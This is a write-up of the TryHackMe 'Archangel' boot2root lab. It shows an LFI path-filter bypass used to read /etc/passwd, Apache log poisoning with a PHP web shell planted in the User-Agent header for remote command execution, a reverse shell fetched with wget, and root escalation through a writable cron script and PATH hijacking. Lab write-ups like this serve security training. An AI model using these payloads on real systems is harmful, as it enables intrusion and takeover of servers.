# Archangel

[<img src=".Images/archangel.jpeg" height=199px>](https://tryhackme.com/room/archangel)

*Boot2root, Web exploitation, Privilege escalation, LFI* - [Archangel](https://tryhackme.com/p/Archangel)

Difficulty: *Easy*

1. [Scan/Enumeration](#scan/enumeration)
2. [Gain Shell](#gain-shell)
3. [Privilege Escalation](#privilege-escalation)

## [Scan/Enumeration]

Let's start with nmap scan.

![archangel-1](.Images/archangel-1.png)

We have SSH on 22 and HTTP on 80. When I check web page, I see `mafialive.thm` in the header and add this my hosts file. In this page I'm doing gobuster scan for txt,php and html extensions with common.txt. When scanning I check the robots.txt file and I see test.php. In this page, when we click the button we see view parameter and /var/www/html/development_testing/mrrobot.php directory. We can try LFI in here. When I try `../../../../../../etc/passwd` I see thats not allowed. For see what is allowed I try `/var/www/html/development_testing`, and this is allowed but when I try `/var/www/html/` I see this isn't allowed. So `/var/www/html/development_testing/` must be in parameter. 

I try `/var/www/html/development_testing/../../../../../etc/passwd` , `/var/www/html/development_testing/....//....//....//....//etc/passwd` , `/var/www/html/development_testing/....\/....\/....\/etc/passwd` and more bypass. Finally I found this: 

`/var/www/html/development_testing/..///////..////..//////..////..//////..////..//////etc/passwd`

![archangel-2](.Images/archangel-2.png)

## [Gain Shell]

Firstly I try to find id_rsa file for archangel user but there is no id_rsa. After I try to read `/var/log/apache2/access.log` and I can. We can use this file for LFI to RCE. I'm copy the mafialive.thm request as curl from browser developer tools and I add php command to User-Agent.

`'User-Agent: <?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); }?>'`

Now I try to run id command.

`mafialive.thm/test.php?view=/var/www/html/development_testing/..///////..////..//////..////..//////..////..//////var/log/apache2/access.log&cmd=id`

![archangel-3](.Images/archangel-3.png)

Now I upload php reverse shell file with wget and acces shell.

## [Privilege Escalation]

I check archangel users home directory but there is nothing for us. I check suid files but there is too nothing interesting. Lastly I check cronjobs and I found /opt/helloworld.sh file work every second. When i check helloworld.sh file i see we have write permission.

![archangel-4](.Images/archangel-4.png)

We have a directory named secret in archangel home directory. We have a executable file, called backup in here. To understand how this file works I use strings command. I found this line `cp /home/user/archangel/myfiles/* /opt/backupfiles`. We can try to change PATH for exploit this but first we need to learn can we run this file with root privilege. I check the suid files and i see we can run this backup file with suid privilege so we can exploit PATH.

![archangel-5](.Images/archangel-5.png)
